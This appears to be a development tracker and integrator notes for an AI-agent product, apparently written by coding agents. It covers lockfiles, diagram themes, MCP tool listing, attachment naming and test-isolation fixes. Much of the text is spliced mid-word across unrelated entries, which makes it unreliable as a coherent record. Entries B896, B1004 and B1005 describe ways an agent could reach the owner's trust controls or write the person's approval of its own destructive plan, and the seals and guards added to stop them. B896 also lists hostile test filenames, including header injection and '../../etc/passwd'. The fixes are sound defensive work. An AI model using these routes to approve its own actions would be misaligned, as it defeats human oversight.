  evaluated by the generating interpreter"*, which is true of `pip-compile` and **not** true of
  `uv pip compile --universal`: universal mode resolves markers symbolically and emits them into the
  lock. Measured here today: `uv pip compile --universal --generate-hashes --python-version 3.14
  requirements.txt` succeeds on this CPython 3.11 / x86_64 box and produces a **105-package,
  204 KB lock carrying 2,260 hashes**, with markers left unevaluated
  (`wassima==2.1.4 ; sys_platform != 'emscripten'`, `win32-setctime==1.2.0 ; sys_platform ==
  'win32'`). The second half of the objection does not hold either: for `numpy==2.4.6` the lock
  carries **all 72 distributions PyPI publishes, 33 of them `aarch64`**, so it is not one
  architecture's hashes. Peason that names the
  encoding as unidentifiable — and the eight-script sweep in
  `tests/test_encoding_guess_reads_its_own_output.py` keeps every answer it has today.
  `Depends:` `B201`, `B280` (both landed). — found while closing `B280` — agent:`ingest2`

- [ ] **B403** **The SVG preview has no thumbnail cache, and `B300` raised the file size it re-scans
  on every request from 2 MiB to 8 MiB.** Found 2026-09-17 while closing `B300`.
  `download_file`'s raster arm writes a JPEG into `.thumbs/` and serves it until the source is
  newer; the SVG arm reads the file, runs the whole gate and serves the bytes, **every time**.
  That was affordable at a 2 MiB cap. Measured now: a realistic 5 MiB export costs 0.125s for the
  gate when it passes and 0.545s when the `B300` tokenizer has to re-judge it, and an 8 MiB one
  0.26s — per request, per viewer, and the chip is re-requested on every message render that is
  not served from the browser cache. A refusal is worse by construction: it carries
  `Cache-Control: no-store`, so a refused 8 MiB file is re-scanned on **every** paint. The gate's
  verdict is a pure function of the byte93` filing:
  * `/tmp/mutlib.py` defaults its root to `/work/pantheon` when `MUTLIB_ROOT` is unset. Every
    agent this wave was told to set it and the one that reported using it says it always did —
    but a default that points at the integrator's tree is a loaded gun regardless of who was
    holding it.
  * `refs/stash` is **shared across worktrees**. The `p5` agent used `git stash push`/`drop`
    inside its worktree and flagged it unprompted: a `drop` from one worktree can destroy an entry
    another worktree pushed. A drop cannot write a working-tree file, so it does not explain this,
    but the hazard is real and the same shape.
  * A restore harness that writes absolute paths rather than paths under its own root.
  **What this costs and what itt loader. Low value and named anyway, because `tests/test_reduced_motion_guard.py::test_every_shipped_page_that_animates_is_under_a_guard` carries `wave-variants.html` as its one exception, and an exception with no row behind it is how a real page eventually joins it. `Verify:` open `/static/wave-variants.html` with Reduce Motion on and see the waves hold still. — found during P10-05 — agent:`p10`

---

## Notes for the integrator

**Cache-buster spread, measured rather than assumed.** Two versioned assets were
touched and both moved across every site that loads them, in this change:
`static/style.css` at `static/index.html:311` and `static/sw.js:84`, and
`static/js/init.js` at `static/index.html:3437` and `static/sw.js:138` — both
`20260918tracefolds1` / `20260715freshroot3` → `20260918a11yfocus1`.
`python3 .pantheon/check-specifiers.py` reports `FORKED 0` after, which is the
check that would catch a half-bump. The other four touched modules —
`static/js/a11y.js`, `static/js/ui.js`, `static/js/startupShell.js` and
`static/login.html` — carry **no** version at any of their sites (`ui.js` alone
is imported bare at more than twenty), so versioning one would fork it; they are
covered by `CACHE_NAME`, bumped `pantheon-v422-p5-trace-folds` →
`pantheon-v423-p10-focus-ring`. `static/index.html` is the document and has no
buster of its own.

**`P10-04` was not touched.** It is not mine, it depends on `P1-09`, and it is
the row that would touch the theme file. Nothing in this change defines
`--accent` anywhere, adds a `var(--accent…)` site, or edits `static/js/theme.js`
or the `THEMES` table; the one new `:root` token is `--focus-ring`, which
resolves through `var(--red)`.

- [x] **B670** **FOLDED INTO `P22-04` (2026-10-01) — the Workbench row that finishes it; do not work this row alone.** **The trigger step in a run's log is drawn with the word `progress`.** Found
  2026-09-18ch of code-and-prose it found nor what scope it landed in
  (`Law 20`):

  ```
  python3 -c "
  import ast, pathlib
  print(sum(isinstance(n, ast.FunctionDef) and n.name == '_is_casual_low_signal'
            for f in pathlib.Path('.').rglob('*.py') if 'tests/' not in str(f)
            for n in ast.walk(ast.parse(f.read_text(encoding='utf-8')))))"
  ```

  — found while landing `P13-19` — agent:`p13c`

---

## Not fixed, not filed

* **`GET /api/memory/timeline` now excludes `kind: "style"` records** and that is a
  behaviour change nothing asked for, made because the alternative was worse: the profile's
  `timestamp` moves on every user message, so leaving it in would pin one row to the top of
  every timeline for ever and push `P13-08`'s whole subject off the screen. Recorded here
  rather than as a `B` because it is part of `P13-17` and has a test.
* **`P13-08` was not started.** It is last in this wave's order and the wave stopped at a
  coherent set. Its two halves already exist to build on — `GET /api/memory/timeline` and
  the skills' own confidence — and it now has one more input, since `P13-04`'s
  `last_used` is the first date in this store that says *when* a thing was reached for.
* **The `manager` and `preface` engines score `recall@5 0.77 / MRR 0.767` on the fixture
  corpus and are byte-identical to each other on every probe.** That has been true since
  `P13-14` and is presumably correct — `preface` binds to the same scorer — but nothing
  asserts they cannot diverge, so a regression in one would be invisible in the other.
  Not filed because it is a question about `.pantheon/retrieval_eval.py`'s own design and
  the harness's author should answer it.

- [ ] **B830** **`known_tool_names()` answers 82 or 84 depending on which module was imported first, and the short answer was silent.** `src/tool_schemas.py` and `src/agent_tools/__init__.py` import each other: `import src.tool_schemas` before `src.agent_loop` raises `ImportError: cannot import name 'FUNCTION_TOOL_SCHEMAS' from partially initialized module`. `known_tool_names()` builds its result from three imports and that is the first of them, so the **first** call in a process that reached `src/tool_policy.py` first answers **82**; the failed import leaves the cycle resolved, so every later call answers **84**. The two names it drops are `host_shell` and `manage_rag`. Measured 2026-09-19 by calling it twice in one process. **It was invisible because that leg was a bare `except Exception: pass` while the two legs below it both logged at debug — and the `P3-17` comment explaining that a partial set is the designed degraded answer, *"said out loud because a caller reading a short list has no other way to know it is short"*, sits on one of the legs that already spoke.** `P2-14` made it speak, which is how this was found and is the extent of the fix; **the import cycle itself is untouched and is what this row is for.** **Scope of the consequence, stated because it is easy to overstate:** this costs **advertisement, not enforcement**. A guide-only turn's refusal is `block_all_tool_calls`, which `blocks()` checks first and which refuses names the denylist never learned — so nothing escapes a disarm. What a short list costs is tha`ModuleNotFoundError`, seven seconds, job over. `check-mcp-schemas.py` and
  the retrieval eval are the same shape; the other twenty-two steps are stdlib-only and were
  simply never reached.
  So the checker suite this project measures itself with — the wiring ratchet, the auth map, the
  silent-failure count, the outbound census, every ratchet whose number has been moved this month
  — had CI evidence for exactly **two** of its members, `check-tracker` and `check-ci-contract`.
  Everything else was evidence from `release-gate.py` on a developer's machine, which is precisely
  what the gate's own footer has been printing all along: *this run is not evidence about CI's*.
  The job is named `Wiring ratchet (check-wiring.py --max 25)` after the one checker that was
  never the problem.
  The fix is `pip install -r requirements.txt`, and the rule is rule eight of
  `check-ci-contract.py`: **a job whose steps hand a script to Python that imports this product
  must install this product's dependencies.** Asked of the script by parsing it, not of a list
  kept in the checker; scoped to run-blocks that actually invoke an interpreter, because
  `docker-publish.yml` reads `APP_VERSION` out of `src/constants.py` with `grep` and a rule that
  cannot tell grepping from running gets turned off. The alternative — teaching the three
  importing checkers to fail soft — buys a fast job that proves less than it claims; the whole
  point of them is that they **call** the thing.
  `Verify:` `tests/test_a_ci_job_installs_wh routes the Real-ESRGAN
  pins down the no-pip path; and the audit run end to end reports the pins instead of erroring.
  `Depends:` `B850`. `Unblocks:` the `Dependency review` workflow going green. — found by running
  the thing — agent:`integrator`

- [x] **B863** **`useDefault = true` does not extend a rule of the same id — it replaces it.** Found
  2026-09-19 by the CI run that verified `B850`, `B854` and `B855`.
  `B851` allowlisted four fake secrets by writing a `[[rules]]` block with `id = "generic-api-key"`
  and hanging a `[rules.allowlist]` off it. That se copy of `mcp_tool_is_readonly` that disagreed with the
  actual gate for every server that advertises nothing (`Law 13`).
  `list_tools` (`src/agent_tools/admin_tools.py:392`) now returns `qualified_name`,
  `server_id`, `parameters`, `read_only`, `annotations` when the server gave any, and
  `disabled` when it is. The parameter list comes from `summarize_tool_parameters`
  (`src/mcp_manager.py:137`), and that is the `Law 14` part: `_format_mcp_params` (the
  system prompt's `Args (JSON): {...}` hint) and `summarize_tool_parameters` are two
  renderings of **one read**, `_read_schema_params` (`:73`), so the cap
  (`_MCP_PARAM_MAX`), the `_sanitize_schema_token` hardening from issue #2660 and every
  schema quirk are handled once and the model can never be told one thing about a tool
  in its prompt and another in the answer to its own tool call. The structured form adds
  the parameter's own `description` and its `enum` choices, which are the two fields
  that decide a call. Descriptions are cut at 240 now, with a `…` so truncation is
  visible. Because a stock install with the browser built-in is already ~25 tools,
  `list_tools` also takes `server_id` (matched against the id or the server name) and
  `tool`, and the unfiltered response **says so in its own text** — the tool teaches the
  narrowing rather than relying on a schema file this agent does not own.
  `Verify:` an operator asks the assistant *"what can my MCP servers actually do"*, and
  the assistant can now name a tool's qualified name, list its parameters with types and
  required-ness, and say whether plan mode will let it run — none of which it could see
  through `manage_mcp` before, at any prompt.
  `CI:` `tests/test_mcp_tool_register_for_the_model.py` (8 cases, driving
  `do_manage_mcp` and `McpManager`; one feeds every returned `qualified_name` straight
  back into `call_tool` and asserts the routing, so the two spellings cannot drift; one
  pins a 40-property hostile schema to `_MCP_PARAM_MAX` with the omitted count reported),
  and `tests/test_the_mcp_form_names_the_field_js.py::test_the_payload_carries_the_schema_and_now_the_annotations`
  — the case that deliberately asserted the absence, **inverted rather than deleted**, so
  the payload `P8-48`'s browser half is built on stays pinned. Mutation-checked: dropping
  `qualified_name` from the projection fails 2 of 8; dropping `annotations` at capture
  fails 6 of the 20 transport cases. `Depends:` nothing. — found by `P8-48`
  — agent:`p8conn`

- [ ] **B868** **On a stock install the model's skill catalogue is empty — all 286 bundled skills are
  invisible to `index_for`.** Found 2026-09-19 while re-measuring `P8-20`.
  No bundled `SKILL.md` carries a `status:` line, so the parser's default applies and all 286 parse
  as `status: draft` with `source: "bundled"`. `index_for` admits a draft ofor everybody else's skills too.
  `Verify:` a stock install retrieves a bundled skill for a natural query at the shipped floor.
  `Depends:` `B590`, `B868`. — found by `P8-20` — agent:`p8skills`

- [x] **B870** **The same product minted two MCP server id shapes depending on which door you came
  in.** Found 2026-09-19 while building `P8-44`. Closed 2026-09-19.
  Three sites minted an id and two of them disagreed: `routes/mcp/mcp_routes.py:262` and
  `src/agent_tools/admin_tools.py:299` used `str(uuid.uuid4())[:8]` — eight hex characters — and
  `scripts/pantheon-mcp:150` used the whole `str(uuid.uuid4())`, thirty-six. Driven, the three
  doors returned lengths `{8, 8, 36}`. All three passed `validate_mcp_server_id`, so nothing was
  broken on the day; that is the whole shape of `Law 13`.
  **Eight wins**, and the reasoning is now in `src/mcp_manager.new_mcp_server_id` beside
  `validate_mcp_server_id`, so the rule that says what a legal eads a literal and nothing else — computing the config would have made it bail
  `ANCHOR-MISSING`. It now `await import()`s `static/js/markdown/mermaidTheme.js` and **calls**
  `applyMermaidTheme(mermaid, scheme)`, the same function `ensureMermaid` calls, against the same
  vendored bundle, for `dark`, `light` and `''`. **The whole cost was `require('node:url')` and the
  new module having no imports** — node 22 loads a dependency-free ESM `.js` from a CJS harness
  directly. `markdown.js` itself still cannot be imported there: it reaches `HTMLInputElement`
  through `ui.js` before its first statement, which no shim in that file would fix, so *that*
  `ensureMermaid` really calls this function is driven in
  `tests/test_markdown_lazy_lib_loading_js.py` i/js/markdown/mermaidTheme.js:39` leaves **all 32
  per-palette legibility assertions green** — `strokeOverrides` replaces `default`'s 2.95–3.25:1
  purple node outline with its own `lineColor` before anything measures it, so the contrast
  floors never see the substitution. What goes red is four tests, and every one of them is a
  comparison against what the library did rather than against what it echoed:
  `test_every_theme_this_product_asks_for_is_one_mermaid_has`,
  `test_every_palette_gets_a_theme_mermaid_actually_has` (which now calls the guard),
  `test_the_override_moved_only_the_dark_scheme` and
  `test_a_diagram_left_in_the_other_scheme_would_still_fail_this`. Without this reading that
  mistake ships.
  `Verify:` a first-time user does not reach this one; the next person to set a Mermaid theme
  does, and what they can now do unaided is get it wrong and be told. Point either scheme at a
  name Mermaid does not have and the suite names the theme that was actually drawn, with both
  fingerprints, instead of agreeing with the config object.
  `tests/test_a_mermaid_theme_name_proves_nothing_js.py` (6 cases) drives the real bundle
  through `tests/harness/mermaid_diagram_parse.js`: the echo, the byte-identical fall-through,
  the control that runs the name check and the ink check side by side on the same wrong answer,
  the five shipped themes being five different themes (without which every comparison here
  passes by accident), and `SCHEME_THEMES`'s own values read out of the module rather than
  retyped. `Depends:` nothing. — found by `B872` — agent:`diagrams`

- [x] **B884** **Mermaid's own dark theme draws edge labels below the contrast floor, on all
  twelve dark palettes.** Found 2026-09-19 while building `B872`, fixed the same day.
  **Before.** `static/js/markdown/mermaidTheme.js` overrode one variable (`nodeBorder`), and the
  edge label came through untouched: `textColor #ccc` on `edgeLabelBackground
  hsl(0, 0%, 34.4117647059%)` measures **4.43:1**, under WCAG 1.4.3's 4.5:1 at Mermaid's own
  16px default (`fontSize` comes back `"16px"`). Mermaid's flowchart stylesheet is
  `.edgeLabel { background-color: ${edgeLabelBackground} }` with
  `.edgeLabel .label text { fill: ${textColor} }`, so those two are the whole of the words on an
  arrow. `B872` shipped `tests/test_every_palette_gets_a_legible_diagram_js.py:258` asserting
  `>= 4.0` for exactly this reason; that fudge is what this row removes.
  **After.** `labelOverrides(themeVariables)` (`mermaidTheme.js:114`) hands `edgeLabelBackground`
  the theme's own `labelBackground`, `#181818`, and it measures **11.06:1**. One line beside
  `strokeOverrides`, read back out of `mermaid.mermaidAPI.getConfig()` like the stroke override
  is, so this file still holds no colour of its own. The choice is not arbitrary: `theme-default`
  sets `edgeLabelBackground = thmaid.parse`
  alone (the grammar half of a draw, no layout, no DOM) costs 5.68 ms for a 4-node flowchart,
  8.57 ms for 12 and 15.67 ms for 30; a conversation holding thirty diagrams therefore pays at
  least ~0.2 s on an explicit settings action. *Restyle in place:* Mermaid emits its theme as a
  `<style>` block inside each SVG, and **575 CSS declarations across its diagram stylesheets take
  their value from a theme variable**, drawing on 183 of them — this repository would own a
  second copy of all of it, keyed to upstream's selectors and re-checked at every bump. That is
  `Law 13` with a 575-declaration price tag, against milliseconds. *Say it in the UI:* costs a
  sentence and fixes nothing; `P8-00` asks what a person can do unaided, and reading a label
  that says the diagrams are stale is not it. Re-draw wins on both numbers and owns nothing
  upstream can move.
  **What landed.** `renderMermaid` stashes each diagram's own source and the scheme it was drawn
  in before handing it to `mermaid.run` (`markdown.js:_stashDiagramSource`) — Mermaid reads the
  `<pre>`'s `innerHTML` and then overwrites it with the SVG, so without that the source exists
  nowhere on the page. One `MutationObserver` on `<html>`'s `style` attribute
  (`markdown.js:_watchScheme`) notices the switch, because `theme.js:292` and both first-paint
  scripts write `color-scheme` as an inline declaration there and `documentScheme()` already
  reads it back — no new event and no second list of palette writers (`Law 14`). The sweep is
  folded into the ordinary draw: `renderMermaid` concatenates `_undrawStale(...)` onto the nodes
  it was going to run anyway, so there is one path through Mermaid and not two. Installed on the
  first draw, so a page with no diagram on it observes nothing and still downloads nothing.
  **One trap, and it is driven.** The watcher keeps its own `_watchedScheme` instead of comparing
  against `_mermaidScheme`: an ordinary draw moves `_mermaidScheme` as a side effect of theming a
  NEW diagram, so a watcher that trusted it would look at a page where a message had just
  arrived, decide the switch was handled, and strand every older diagram permanently. The flag is
  also read and cleared at call time rather than when the pass lands, so a second palette click
  during a sweep gets its own pass. Both are mutation-tested: comparing `_mermaidScheme` fails
  `test_a_new_diagram_arriving_after_the_switch_does_not_strand_the_old_ones`; dropping the sweep
  fails three.
  `Verify:` switch from a dark palette to a light one (or back) with diagrams already in the
  conversation and every one of them is re-drawn in the palette you are now looking at — no
  reload, nothing to click, and no diagram left drawing light-on-light or dark-on-dark.
  `tests/test_a_palette_switch_redraws_the_diagrams_js.py` (8 cases) drives the shipped
  `static/js/markdown.js` for real against a Mermaid stand-in that marks `data-processed` and
  overwrites the element the way the vendored bundle does: the source surviving the round trip,
  the re-draw itself, a within-scheme palette change re-drawing nothing, a new diagram not
  stranding the old ones, two clicks settling on the last one, two clicks that cancel out
  re-drawing nothing, no diagram meaning no observer, and the observer being on the one element
  every palette writer writes. It loads the module through the loader in
  `tests/test_markdown_lazy_lib_loading_js.py` rather than adding a copy of it —
  `B882` is about there being four already. `tests/test_every_palette_gets_a_legible_diagram_js.py`
  carries the control that fixes the numbers above in a test rather than in prose.
  `Depends:` `B872`. — found by `B872` — agent:`diagrams`

- [ ] **B886** **The unattended audit says it routes an action to the manual test UI, and no browser
  file reads the field it routes with.** Found 2026-09-19 while building `P8-09`.
  `_audit_one_skill` returns `{"result": "approval_required", …}` at `routes/skills_routes.py:1249`,
  under a comment at `:1236` saying it routes the action to the manual test UI. `grep -rn
  "approval_required" static/` returns **0**. `_applyAuditResults` (`static/js/skills.js:2015`)
  falls through to `r.verdict.verdict`, so such a skill renders identically to any other
  `inconclusive` and the only thing distinguishing it is free text in the audit log line.
  **And the routing c`planWindow.js`**; the plan suites that already existed (67 cases) pass unchanged.
  `Depends:` nothing. — reported by the owner — agent:`integrator`

- [x] **B895** **The two standalone GPU compose files stopped equalling the base plus their
  overlay.** The published image landed in `docker-compose.yml` — `image:
  ghcr.io/impanick/pantheon:latest` and `pull_policy: always` on `pantheon` — and not in
  `docker-compose.gpu-nvidia.yml` or `docker-compose.gpu-amd.yml`, whose own header says they are
  *"equivalent to: docker-compose.yml + docker/gpu.nvidia.yml ..th. `Verify:` the same file, 12
  cases, green. `Depends:` nothing. — found by the suite — agent:`integrator`

- [x] **B896** **`app_api` reached the owner's own trust controls, and the blocklist that was supposed to stop it could be walked around.** The agent's generic `app_api` loopback carries the internal-tool token, `app.py:430` attributes it to the owner, and `require_admin` accepts the token outright — so on every route `_APP_API_BLOCKLIST_*` (`src/tools/system.py`) did not name, the bridge **is** the owner. Done 2026-09-27. **Six doors it did not name, eacersisted. `P6-18`'s *steer applied* confirmation never arrives. `P4-03`'s *Skill learned* note and the teacher's takeover banner never draw live. **`P4-15`'s `tmux_session` rides `tool_progress`** (`src/agent_tools/subprocess_tools.py:255`), so an attach affordance built on it is dead on arrival until this is fixed. Every one of those rows tested its emit and its handler, and nothing tested the middle. `P4-08` added only the meter's two types, as an `elif` reading the loop's `AGENT_METER_EVENT_TYPES`, and did not widen the rest. Fix: forward what is not named (`else: yi/` check — names the ASCII fold; a listing cached before this (`email_attachment_metadata_cache`) is shown the same way, so the chip and the download agree. **Compose tokens** stay `<32 hex>_<name>` with the hex the key; the name part is `stored_name`, and where the person's name is not storable as given (`Minutes: what we agreed?.pdf` → `Minutes_ what we agreed_.pdf`) it is kept beside the file as `<hex>.name` and sent from there; `DELETE /compose-upload/{token}` and delivery remove both; a token staged before this (no `.name`, in a saved draft or the scheduled-email table) sends under the name it was staged with (`Law 1`). Staged this way by `compose-upload`, `compose-from-attachment` (Forward), `compose-from-pantheon` (a document by its title — a `/` in a title kept as `_`, not dropped as a folder) and `compose-from-pantheon-zip`. The agent's `download_attachment` stores the same way and tells the agent the sender's name. **Kept deliberately**: `B04`'s dotfile refusal in `attachment-as-doc` read the extracted name, which `stored_name` never makes a dotfile, so it asks the sender's name — a `.bashrc` attachment is refused exactly as before (driven through a real extraction, not a stub). `FORBIDDEN.md` Part 2: every download stays `attachment` (built by helpers with no `inline` parameter); the inline-image `image/` check is untouched. `Verify:` `tests/test_a_mail_attachment_keeps_its_name_on_the_way_out.py` — **37 cases**, the real email router through `TestClient` over a fake IMAP handing back raw message bytes, `/send` captured and parsed back by two mail parsers (`compat32` and `policy.default`), the agent's server and the naming functions called directly; nothing reads a source file (`Law 20`): the row's `Verify:` (`Q3 Board Pack – final (v2).pdf` downloads with `attachment; filename="Q3 Board Pack final (v2).pdf"; filename*=UTF-8''Q3%20Board%20Pack%20%E2%80%93%20final%20%28v2%29.pdf`, and is forwarded and uploaded-then-sent under that name); seven hostile names — CR/LF with a quote, quotes, `../../etc/passwd`, an RTL override, 250 Cyrillic letters, `.bashrc`, `Minutes: what we agreed?.pdf` — through the download header (`attachment` only, no CR/LF, no injected header, `filename*` decoding to the display name, the stored name safe and ≤ 200 bytes) and through forward-and-send (no header the sender wrote in either parser, every line ≤ 998 and every `filename` line ≤ 80) and through `mime_attachment_disposition` alone; the listing, the download and the forward agreeing; the kept name, its cleanup on send and on DELETE, its lookup only by a 32-hex key; the pre-row token; a document attached under its title; the dotfile refusal; the inline image in another script; the agent's download; the cached listing; the fold. **25 of 37 fail on the previous tree** with the new `src/file_names.py` copied in so the file can be collected (without it, collection fails); the 12 that pass are the module's own rules (10), the pre-row token (`Law 1` pin) and the forward of `.bashrc` (the old regex kept that one name). Mutation, in a copy of the tree, **28 of 28 caught**: the extraction cache back on the regex (5 red); the download header left to Starlette (9), named by the stored name (5); the listing not made safe to show (1); the outgoing part named by `add_header(filename=)` (2); sent under the stored name ignoring the kept one (6); the kept name never written (7), left behind on delivery (1) and on DELETE (1), reachable by any key (1); compose-upload answering the stored name (1); Forward named by the extraction file (5); Pantheon items back on the regex (1); a `/` cutting a title (1); the dotfile guard asking only the stored name (1); the inline header taking the name raw (1); a stemless fold (2); the plain form for any ASCII (5); one encoded segment not folded (4), continuations not folded (3), cut inside an escape (3), no segment cap (3); an ASCII `filename=` beside the encoded one (8); the MIME name not made safe (3); the agent's extraction back on the regex (1) and the agent told the stored name (1); a cached listing shown raw (1), a cached invisible name kept as nothing (1). — found by `docs-names` — agent:`docs-mail`

- [x] **B1001** **A chat message saved before `P21-03` still names its attachments by their ASCII fold.** — **done 2026-10-01 (agent `docs-mail`, `63f1c80`). Read-side, as the row says; nothing is rewritten.** **Measured on `c6f49b4`** through `GET /api/history/{id}`: a message saved with `attachments[].name` `Q3_Board_Pack_final_v2.pdf`, over an upload row whose `original_name` is `Q3 Board Pack – final (v2).pdf`, came back as the fold from all three of the route's branches (the page read from the database, the in-memory session, the database fallback) — so the chip said the fold after every reload, and *open as document* from it titled the document `Q3_Board_Pack_final_v2`. **Decided — what is honest for an old message:** the name is resolved through the upload row when the history is read. The row's name (`upload_display_name`: its `display_name`, or for a row from before `P21-03` the person's name recovered from `original_name` when it provably folds to the saved `name`) when the upload is still indexed and is the reader's own; **what was saved** otherwise — the upload has gone (retention), it is another person's (a message can carry any id, and the lookup must not tell the reader somebody else's file name), its rows disagree about the owner, or the row names nothing (falling back to its stored file's name would put the id over the saved name). Nothing is written: the stored `chat_messages.metadata`, and the in-memory `msg.metadata` that branch hands out by reference, keep what they said when saved; the names are swapped on copies on the way out (`Law 1`). **The lookup** is new, `UploadHandler.display_names_for(ids, owner=)`: one index read per history request, read-only, `reserve_upload`'s owner rule without the admin widening (a history is shown only to its owner). `resolve_upload` was the obvious call and is wrong here — it *reserves*, writing the index's `last_accessed` on every history load (a mutation using it reddens 5 of 9, the index-untouched case among them). With no upload handler, or a lookup that fails, the saved names stand and the chat still opens. `Verify:` `tests/test_an_old_chat_shows_its_attachments_by_their_own_names.py` — **9 cases**, `GET /api/history/{id}` through `TestClient` on a real SQLite database and a real `UploadHandler` over a temp store, nothing reading a source file (`Law 20`): the row's `Verify:` through each of the three branches (a pre-row upload named by its recovered name, a new one by its `display_name`, another person's, a gone one, a split-owner one and a nameless one by what was saved); the in-memory message not rewritten; the stored row and `uploads.json` byte-for-byte unchanged; another reader told nothing of alice's names; a signed-out single-user install resolving unowned uploads only; no handler (quietly) and a failing lookup leaving the saved names; the lookup itself. **6 of 9 fail on the previous tree** (the three that pass pin: nothing rewritten, another reader gets the saved names, no handler). Mutation, in a copy of the tree, **11 of 11 caught after one round**: either branch not resolved (2 and 2), names written into the live message (1), another owner's row answering (5), an owned row answering a signed-out reader (1), split-owner rows answering (4), the row's ASCII `name` instead of `upload_display_name` (5), the lookup through `resolve_upload` (5), a nameless row answering with its file's id (4), a failed lookup failing the history (1), no handler not handled (1 — it survived the first round, because the `except` caught the `AttributeError`; the case now also asserts that nothing is logged as a failed lookup). — found by `docs-names` — agent:`docs-mail`

- [x] **B1002** **A test undid its own admin patch in the wrong order, and every later non-admin was an admin to the dispatcher.** `tests/test_the_agent_raises_its_own_limits_for_the_run.py`'s `_drive` patched `tool_execution._owner_is_admin` by `setattr` and then the same globals dict by `setitem` (the wave-three fix for a re-imported dispatcher). pytest undoes every `setattr` before any `setitem`, so the real check came back and was then replaced by the lambda for the rest of the session: 27 privilege cases in `P20-03`'s file, `test_a_non_admin_holding_the_privilege_is_still_refused_the_shell` and `B971`'s guide-only backstop failed in the full suite and passed alone. Found by a module-identity probe over a full run and bisection (100 preceding files, four halvings, then file by file). — found at the `P20` merge — agent:`integrator` — **done 2026-10-01.** The `setattr` runs only when the module is a different object from the globals the loop reads. `Verify:` that file followed by the privilege matrix and the guide-only file: 109 passed (27 failed before).

- [x] **B1003** **A re-imported `core.middleware` was left behind, and a route bound to the first copy refused every later test's token.** `tests/test_reserved_username_admin_escalation.py` cleared `core.middleware` with `clear_module` and imported it again, minting a second `INTERNAL_TOOL_TOKEN`; `routes.backup_routes`, imported earlier, kept `require_admin` from the first copy, so the six `B958` backup cases were *"Admin only"* in the full suite. And `tests/helpers/fresh_import.drop_for_fresh_import` restored `sys.modules` but not the parent package's attribute — five modules were seen split between the two in one run. — found at the `P20` merge — agent:`integrator` — **done 2026-10-01.** The file drops the module through `drop_for_fresh_import`, which now also restores the package attribute. `Verify:` `test_a_refused_settings_change_stays_refused.py`, then that file, then the backup file: 60 passed (6 failed before).

- [x] **B1004** **The agent could answer its own plan: `send_to_session` into the chat it was running in wrote "Apply the plan" as the person.** Found 2026-10-01 while working `B994`, and measured before a line was changed: a `manage_documents delete` plan, then `send_to_session` with `chat-bob\nApply the plan` from inside `chat-bob`, then `apply_plan` — applied, and the document was deleted. `send_to_session` persists its message as the target chat's newest *user* message (`Session.add_message` → `_persist_message`, timestamped now), and that is exactly where `document_folders.plan_answer` reads the person's answer, after the plan was made — so `P21-02`'s "the agent cannot approve its own plan, because it does not write the person's messages" was false for this one tool, and `B994` puts every delete behind that yes. **Fixed on `docs-more` (`ee2f499`)** because `B994`'s promise is false without it and `B995` opens the tool to every non-admin's agent: `send_to_session` refuses the chat the call runs in ("talks to another chat, and this is the chat you are in"). Talking to the chat you are already in was never what it is for. Another chat still works. On a tainted run the trust gate should already stop both calls — `send_to_session` is `NETWORK_EGRESS`, `apply_plan` `DESTRUCTIVE` (read from `TOOL_CAPABILITIES`, not driven) — so the measured path is the untainted one: no adversary, a model being "helpful". `Verify:` `test_the_agent_cannot_answer_its_own_plan_by_messaging_its_own_chat` (fails with the guard removed: the send returns a reply). — found by `docs-more`

- [x] **B1005** **An admin's agent can still write the person's answer to a plan, through `app_api` → `POST /api/session/{sid}/inject_messages`.** — found by `docs-more` — **done 2026-10-01 (agent `w5-docs`, `01ec930`). The row's second option, which closes every writer at once — and there were seven, not one.** **Measured first** (`Law 3`), each driven against the reading `plan_answer` had (the chat's newest user message): the row's door was real — the real `do_app_api` → `inject_messages` `{"role": "user", "content": "Apply the plan"}`, then `apply_plan`, and the document was deleted — and so were six more: `POST /api/session/{sid}/message` (which, unlike `inject_messages`, also stored a caller's metadata blob as sent); `edit-message`, turning the person's "Don't change anything" into the yes; the chat route itself, reached on the agent's loopback or by a bearer token; `send_to_session` from another of the owner's chats (`B1004`'s guard refuses only the chat the call runs in); a scheduled task delivering its prompt into the chat as a user message (`_deliver_task_result`); and a yes the person gave an *older* plan, re-stamped after the new one by a compaction (`replace_messages` writes every kept row's timestamp as now). **The seal.** `tool_approval_scopes.seal_person_message` — an HMAC under `B70`'s grant key with its own payload tag, over the chat id, the moment (naive UTC, the clock a plan's `created_at` is on) and a digest of the text the row will hold — stored in the server-owned metadata field `_person_said`; `person_said_at` verifies it fail-closed (shape checks before `compare_digest`, as `verify_chat_session_grant`). The chat route seals the message it persists (`add_user_message(from_person=…)`, from `build_chat_context`) only when `auth_helpers.request_is_a_person` says the request is a person: not a delegated credential (`B70`), not a request carrying the internal-tool header (any value — a browser never sends one), not the internal tool user; anything that is not a request is not a person. `plan_answer` takes the newest user message whose seal verifies and was said after the plan, and passes every other row over. So a copy into another chat (a fork, a group-chat sync, an import) does not verify — the chat is in the seal; an edit voids it — the text is; a replay keeps its moment — and so a compaction cannot turn an old yes into a new one. Belt and braces: `_person_said` joined `_SERVER_OWNED_METADATA_KEYS`, and `POST …/message` now passes the caller's blob through `sanitize_client_message_metadata` as `inject_messages` does (which also stops it storing a caller's `tool_events` — `B70`'s signature already made those inert). The group chat's sync through `inject_messages` is unchanged, driven. **Left as it is (`Law 17`)**: a same-host request under `LOCALHOST_BYPASS` is answered as a person — making one takes a shell, and an agent with a shell is not held by this. `Verify:` `tests/test_only_the_person_answers_a_plan.py` — **14 cases**, nothing reading a source file (`Law 20`): a real SQLite database and a real `SessionManager`, the plan made by the real dispatcher, `build_chat_context` driven to the moment it persists the turn's message with a real `starlette` request (a person, a token, the loopback), the real session and history routers reached through the real `do_app_api` (its httpx loopback landed on them in process, behind the one thing `app.py`'s middleware does for the loopback), `send_to_session` through `execute_tool_block`, `TaskScheduler._deliver_task_result`, `SessionManager.replace_messages`; plus the seal's binding (chat, text, moment, malformed signatures, the sanitiser) and `request_is_a_person` asked directly. **With the old `plan_answer` and no seal (the enforcement reverted, the new helpers present so the file collects), 11 of 14 fail**; the 3 that pass are the person's own yes and no through the chat route and the group-chat sync. **Mutation: 16 run, 15 caught**: the old code whole 11; the answer read without the seal 9 (of 61, with the two plan test files); the seal's moment not compared 1; the chat route never sealing 4, sealing every request 2; the loopback header a person 2, a token a person 2, the internal tool user a person 1; the sanitiser keeping the field 2; the message route unsanitised 1; the seal not bound to the chat 1, the text 2, the moment 1; any signature verifying 2; a malformed signature reaching `compare_digest` 1. **The survivor** — dropping the stored-timestamp bound before the seal is read — is behaviourally equivalent (a person's row is stored after it is sealed, so the bound only spares reading older rows) and is kept and recorded as such, as `B70`'s length check is. Existing tests changed: the `say` helpers in `test_the_agent_files_documents.py` and `test_a_person_s_agent_keeps_their_own_documents.py` 